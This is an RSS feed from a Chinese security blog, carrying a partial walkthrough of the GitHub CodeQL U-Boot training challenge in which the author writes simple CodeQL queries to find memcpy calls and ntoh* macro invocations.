<?xml version="1.0"?>
<rss version="2.0">
    <channel>
        <title>Milkii0的秘密花园</title>
        <link>http://example.com</link>
        <description></description>
        <language>en</language>
        <pubDate>Fri, 10 Jun 2022 10:39:31 +0800</pubDate>
        <lastBuildDate>Fri, 10 Jun 2022 10:39:31 +0800</lastBuildDate>
        <category>CodeQL</category>
        <category>codeql, 搭建教程</category>
        <category>web,HTTP</category>
        <category>redis,未授权,漏洞利用</category>
        <category>solr, 漏洞复现</category>
        <category>solr, 代码审计</category>
        <category>前后端分离</category>
        <category>文件上传靶场</category>
        <category>Java反序列化</category>
        <category>ysoserial调试</category>
        <category>木马,汇总</category>
        <category>pikachu,web靶场</category>
        <category>dorabox,靶场练习</category>
        <category>sql注入靶场</category>
        <category>webgoat</category>
        <item>
            <guid isPermalink="true">http://example.com/2022/06/10/CodeQLU-BootChallenge%20(CC++)/</guid>
            <title>CodeQLU-BootChallenge(CC++)</title>
            <link>http://example.com/2022/06/10/CodeQLU-BootChallenge%20(CC++)/</link>
            <category>CodeQL</category>
            <pubDate>Fri, 10 Jun 2022 10:39:31 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&#34;背景&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#背景&#34;&gt;#&lt;/a&gt; 背景&lt;/h1&gt;
&lt;p&gt;需要在 U-Boot 中寻找一组 9 个远程代码执行漏洞&lt;br&gt;
漏洞点位于 memcpy 函数&lt;br&gt;
但并非所有调用 memcpy 函数的都存在漏洞&lt;br&gt;
所以我们需要减少误报率，找到真正存在漏洞的 memcpy 调用&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://lab.github.com/githubtraining/codeql-u-boot-challenge-(cc++)&#34;&gt;放上题目链接&lt;/a&gt;&lt;br&gt;
关于环境搭建根据题目提示就可以顺利完成哦&lt;br&gt;
也可以参考我的文章 &amp;quot;CodeQL for VSCode 搭建流程&amp;quot;&lt;br&gt;
 不出意外会放在我的&lt;a href=&#34;https://milkii0.github.io&#34;&gt;博客中&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&#34;step-3-our-first-query&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#step-3-our-first-query&#34;&gt;#&lt;/a&gt; Step 3 - our first query&lt;/h1&gt;
&lt;p&gt;在项目中寻找所有名为’strlen’的函数&lt;br&gt;
语法类似于 sql 语句&lt;br&gt;
 &lt;code&gt;import cpp&lt;/code&gt; : 导入 c++ 规则库&lt;br&gt;
 &lt;code&gt;From Function f1&lt;/code&gt; : 声明一个 Function 类的变量为 f1&lt;br&gt;
 &lt;code&gt;where f1.getName() = &amp;quot;strlen&amp;quot;&lt;/code&gt; : Function.getName () 顾名思义用于获取此声明的名称，也就是名称和&amp;quot;strlen&amp;quot; 相等的声明会被挑选出来&lt;br&gt;
 &lt;code&gt;select f1,&amp;quot;a function named strlen&amp;quot;&lt;/code&gt; : select 后接要在 result 中展示的项目，用逗号分隔&lt;br&gt;
 3_function_definitions.ql&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;import cpp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;from Function f1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;where f1.getName() = &amp;quot;strlen&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;select f1,&amp;quot;a function named strlen&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;f67230350390011a65f16d340406022d.png&#34; alt=&#34;f67230350390011a65f16d340406022d.png&#34;&gt;&lt;br&gt;
 直接在 main 提交&lt;br&gt;
&lt;img src=&#34;b20d0a09af05b0e0b6f0889c8bd499fe.png&#34; alt=&#34;b20d0a09af05b0e0b6f0889c8bd499fe.png&#34;&gt;&lt;br&gt;
commit 中查看结果，通过&lt;br&gt;
&lt;img src=&#34;9c74098f2c390ad1f066fa3cd8fc6349.png&#34; alt=&#34;9c74098f2c390ad1f066fa3cd8fc6349.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;step-4-anatomy-of-a-query&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#step-4-anatomy-of-a-query&#34;&gt;#&lt;/a&gt; Step 4 - Anatomy of a query&lt;/h1&gt;
&lt;p&gt;仿照上一步，在项目中寻找所有名为’memcpy’的函数&lt;br&gt;
 4_function_definitions.ql&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;import cpp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;from Function f&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;where f.getName() = &amp;quot;memcpy&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;select f,&amp;quot;a function named memcpy&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;提交查看结果，通过&lt;br&gt;
&lt;img src=&#34;e7a2871ee72e24c0663d8b9042c8e434.png&#34; alt=&#34;e7a2871ee72e24c0663d8b9042c8e434.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;step-5-using-different-classes-and-their-predicates&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#step-5-using-different-classes-and-their-predicates&#34;&gt;#&lt;/a&gt; Step 5 - Using different classes and their predicates&lt;/h1&gt;
&lt;p&gt;自定义规则，查找三个名为 &lt;code&gt;ntohs&lt;/code&gt; ,  &lt;code&gt;ntohl&lt;/code&gt;  or  &lt;code&gt;ntohll&lt;/code&gt;  的宏定义&lt;br&gt;
需要一个紧凑的查询，而不是三个查找案例组合在一起&lt;br&gt;
给出以下两种方法&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;利用正则表达式&lt;br&gt;
 &lt;code&gt;string&lt;/code&gt;  类有一个方法 &lt;code&gt;regexpMatch&lt;/code&gt; ，接收器将参数与正则表达式匹配&lt;br&gt;
那我们需要先找到宏定义，再对该字符串进行正则匹配（使用的 java 的匹配模式）&lt;br&gt;
5_function_definitions.ql&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;import cpp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;from Macro m&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;where m.getName().regexpMatch(&amp;quot;ntoh(s|l|ll)&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;select m,&amp;quot;macros named ntohs, ntohl or ntohll&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;运行&lt;br&gt;
&lt;img src=&#34;dc5f776d88ef17d90e7be870a333f285.png&#34; alt=&#34;dc5f776d88ef17d90e7be870a333f285.png&#34;&gt;&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;使用集合表达式&lt;br&gt;
给出的格式：&amp;lt;your_variable_name&amp;gt; in [“bar”, “baz”, “quux”]&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;import cpp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;from Macro m&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;where m.getName() in [&amp;quot;ntohs&amp;quot;,&amp;quot;ntohl&amp;quot;,&amp;quot;ntohll&amp;quot;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;select m,&amp;quot;macros named ntohs, ntohl or ntohll&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;运行后和之前的结果相同，提交通过&lt;/p&gt;
&lt;p&gt;PS：&lt;br&gt;
上学的时候为了过考试自学的 c++，就是一些简单的语法&lt;br&gt;
看题目说明也没看明白 ntoh 族函数到底是个啥&lt;br&gt;
后来看见了&lt;a href=&#34;https://bestwing.me/codeql.html&#34;&gt; swing 的文章&lt;/a&gt;&lt;br&gt;
才知道 ntoh 族函数通常用来进行网络字节序到主机字节序的转换&lt;br&gt;
其实自己看到的时候就应该去查的，但是因为对题目影响不大就犯懒没去:-(&lt;br&gt;
以后不能这样了！看见没见过的看不懂的一定要去弄清楚&lt;/p&gt;
&lt;h1 id=&#34;step-6-relating-two-variables&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#step-6-relating-two-variables&#34;&gt;#&lt;/a&gt; Step 6 - Relating two variables&lt;/h1&gt;
&lt;p&gt;找到所有对 &lt;code&gt;memcpy&lt;/code&gt;  函数的调用&lt;br&gt;
先看看给的例子&lt;br&gt;
 &lt;code&gt;FunctionCall.getTarget()&lt;/code&gt;  查询该函数被调用的位置&lt;br&gt;
直接和 &lt;code&gt;Function&lt;/code&gt;  类型的 &lt;code&gt;fcn&lt;/code&gt;  对比值，说明他返回的值应该就是 &lt;code&gt;Function&lt;/code&gt;  类型（这点在下面优化中会用到）&lt;/p&gt;
&lt;p&gt;通过 &lt;code&gt;Function.hasName()&lt;/code&gt;  获取方法名&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;import cpp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;from FunctionCall call, Function fcn&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;where&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  call.getTarget() = fcn and&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  fcn.getDeclaringType().getSimpleName() = &amp;quot;map&amp;quot; and&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  fcn.getDeclaringType().getNamespace().getName() = &amp;quot;std&amp;quot; and&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  fcn.hasName(&amp;quot;find&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;select call&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;如果你想要省略中间变量 &lt;code&gt;Function&lt;/code&gt; ，使查询的更加紧凑，可以参考以下两个对比&lt;br&gt;
 &lt;code&gt;c1.getClass2()&lt;/code&gt;  返回的是 Class2 类型的值，因此可以直接调用 Class2 的方法&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from Class1 c1, Class2 c2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;where&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  c1.getClass2() = c2 and&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  c2.getProp() = &amp;quot;something&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;select c1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;from Class1 c1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;where c1.getClass2().getProp() = &amp;quot;something&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;select c1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;根据以上案例思考&lt;br&gt;
我们需要找到 &lt;code&gt;memcpy&lt;/code&gt;  函数被调用的位置，可以使用&lt;br&gt;
 &lt;code&gt;FunctionCall.getTarget()&lt;/code&gt; &lt;br&gt;
 并希望查询更加紧凑，可以直接获取找到的函数的名称并进行判断&lt;br&gt;
 &lt;code&gt;FunctionCall.getTarget().getName=&amp;quot;memcpy&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;6_memcpy_calls.ql&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;import cpp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;from FunctionCall functioncall&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;where functioncall.getTarget().hasName(&amp;quot;memcpy&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;select functioncall&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;提交通过&lt;br&gt;
&lt;img src=&#34;40bdea82763f6ab88adaccc6e47931b4.png&#34; alt=&#34;40bdea82763f6ab88adaccc6e47931b4.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;step-7-relating-two-variables-continued&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#step-7-relating-two-variables-continued&#34;&gt;#&lt;/a&gt; Step 7 - Relating two variables, continued&lt;/h1&gt;
&lt;p&gt;寻找所有对 &lt;code&gt;ntoh*&lt;/code&gt;  宏定义的调用&lt;/p&gt;
&lt;p&gt;这里用到的是 &lt;code&gt;MacroInvocation&lt;/code&gt;  这个类，顾名思义就是宏定义调用的类&lt;br&gt;
鼠标悬浮看其注释也能看出来&lt;br&gt;
&lt;img src=&#34;69d9e0e24f06860213619664c0c91321.png&#34; alt=&#34;69d9e0e24f06860213619664c0c91321.png&#34;&gt;&lt;br&gt;
 那么我们就可以通过 &lt;code&gt;getMacro()&lt;/code&gt;  寻找被调用的宏定义，并得到返回的 &lt;code&gt;Macro&lt;/code&gt;  类型值&lt;br&gt;
再获得找到的 &lt;code&gt;Macro&lt;/code&gt;  名称进行正则匹配，即可获得我们想要的结果&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;import cpp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; from MacroInvocation macInvo&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; where macInvo.getMacro().getName().regexpMatch(&amp;quot;ntoh.*&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; select macInvo&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;（备注：关于正则表达式，不太会写，找的 java 正则 api 看的。&lt;br&gt;
 &lt;code&gt;.&lt;/code&gt;  表示匹配除换行符 \n 之外的任何单字符， &lt;code&gt;*&lt;/code&gt;  表示零次或多次，&lt;br&gt;
我这里希望得到的结果是以 &lt;code&gt;ntoh&lt;/code&gt;  开头的宏定义都会被选中。&lt;br&gt;
如果有不对的地方，还希望可以被提出指正◔ ‸◔）&lt;/p&gt;
&lt;p&gt;提交通过&lt;br&gt;
&lt;img src=&#34;5807d43f1ce8796d351638d6f55cde4a.png&#34; alt=&#34;5807d43f1ce8796d351638d6f55cde4a.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;step-8-changing-the-selected-output&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#step-8-changing-the-selected-output&#34;&gt;#&lt;/a&gt; Step 8 - Changing the selected output&lt;/h1&gt;
&lt;p&gt;根据提示，使用 &lt;code&gt;getExpr()&lt;/code&gt;  这个 predicate&lt;br&gt;
 先看看这个 &lt;code&gt;getExpr()&lt;/code&gt;  的注释说明&lt;br&gt;
是用来获取宏定义表达式的&lt;br&gt;
如果顶级拓展元素不是表达式，它只是一条语句，将不会被选中列为结果&lt;br&gt;
&lt;img src=&#34;09d6ad29dcccc9157677864a39460e27.png&#34; alt=&#34;09d6ad29dcccc9157677864a39460e27.png&#34;&gt;&lt;br&gt;
 使用 &lt;code&gt;select macInvo.getExpr()&lt;/code&gt; ，就能获得宏定义调用相关的表达式&lt;br&gt;
 8_macro_expressions.ql&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;import cpp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; from MacroInvocation macInvo&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; where macInvo.getMacro().getName().regexpMatch(&amp;quot;ntoh.*&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; select macInvo.getExpr()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;例如点击其中一个结果，就会跳转至下图位置&lt;br&gt;
&lt;img src=&#34;82697e23ad6a1cd05073bea662213bf8.png&#34; alt=&#34;82697e23ad6a1cd05073bea662213bf8.png&#34;&gt;&lt;br&gt;
 提交通过&lt;br&gt;
&lt;img src=&#34;839b8030c2474b52816e9afc1212d9a1.png&#34; alt=&#34;839b8030c2474b52816e9afc1212d9a1.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;那么查询表达式和查询调用的区别是啥？&lt;br&gt;
看注释说明，&lt;br&gt;
 &lt;code&gt;getExpr()&lt;/code&gt; ：&lt;br&gt;
&lt;em&gt;Gets a top-level expression associated with this macro invocation,if any.&lt;br&gt;
Note that this predicate will fail if the top-level expanded element is not an expression (for example if it is a statement).&lt;br&gt;
This macro is intended to be used with macros that expand to a complete expression.&lt;br&gt;
In other cases, it may have multiple results or no results.&lt;/em&gt;&lt;br&gt;
 获取关于宏调用的顶级表达式&lt;br&gt;
注意，如果顶级扩展元素不是一个表达式的话查询将失败（例如，它是一个语句）&lt;br&gt;
此宏用于扩展为完整表达式的宏，在其他情况下可能会有多个结果或没有结果&lt;/p&gt;
&lt;p&gt;&lt;code&gt;getMacro()&lt;/code&gt; ：&lt;br&gt;
&lt;em&gt;Gets the macro that is being accessed.&lt;/em&gt;&lt;br&gt;
 获取正在访问的宏&lt;/p&gt;
&lt;p&gt;即 &lt;code&gt;getMacro()&lt;/code&gt;  会获取所有调用的宏，即使他只是一个语句&lt;br&gt;
而 &lt;code&gt;getExpr()&lt;/code&gt;  只会获取宏调用的顶级表达式&lt;br&gt;
所以 &lt;code&gt;getExpr()&lt;/code&gt;  得到的结果集应该包含于 &lt;code&gt;getMacro()&lt;/code&gt;  的结果集&lt;br&gt;
这里放上&lt;a href=&#34;https://www.zhihu.com/question/20750344&#34;&gt;语句和表达式的区别讨论链接&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&#34;step-9-write-your-own-class&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#step-9-write-your-own-class&#34;&gt;#&lt;/a&gt; Step 9 - Write your own class&lt;/h1&gt;
&lt;p&gt;首先看看学习 &lt;code&gt;exists&lt;/code&gt;  关键词给出的例子：&lt;br&gt;
这个规则只是为了获取不秃头的所有人&lt;/p&gt;
&lt;p&gt;不秃头的人都会有头发，那么他们的头发都会对应一个或多个颜色&lt;br&gt;
其中 &lt;code&gt;t.getHairColor()&lt;/code&gt;  会返回一个 &lt;code&gt;string&lt;/code&gt;  类型的值，例如 &amp;quot;red&amp;quot;&lt;br&gt;
 如果我们需要获得不秃头的人，我们并不需要知道他们头发的具体颜色，只需要知道 &lt;code&gt;t.getHairColor()&lt;/code&gt;  会返回 &lt;code&gt;string&lt;/code&gt;  类型的值即可，因为秃头 &lt;code&gt;getHairColor()&lt;/code&gt;  时，不会返回任何值&lt;/p&gt;
&lt;p&gt;所以我们利用 &lt;code&gt;string&lt;/code&gt;  类型的变量完成该操作&lt;br&gt;
更好的方式是使用 &lt;code&gt;exists&lt;/code&gt;  关键词，因为我们只是在 &lt;code&gt;where&lt;/code&gt;  中使用该变量&lt;br&gt;
例如， &lt;code&gt;exists(string c | t.getHairColor() = c)&lt;/code&gt;  使用了 string 类型的临时变量，用于获取 &lt;code&gt;t.getHairColor()&lt;/code&gt;  返回了 &lt;code&gt;string&lt;/code&gt;  值的 &lt;code&gt;t&lt;/code&gt; ，也就是查询了所有头发颜色的值为 &lt;code&gt;string&lt;/code&gt;  类型的人&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from Person t&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;where exists(string c | t.getHairColor() = c)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;select t&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/*在CodeQL中，以下代码功能同于以上代码，给出只是为了更好地理解*/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;from Person t, string c&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;where t.getHairColor() = c&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;select t&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;再来看看类定义中给出的案例&lt;/p&gt;
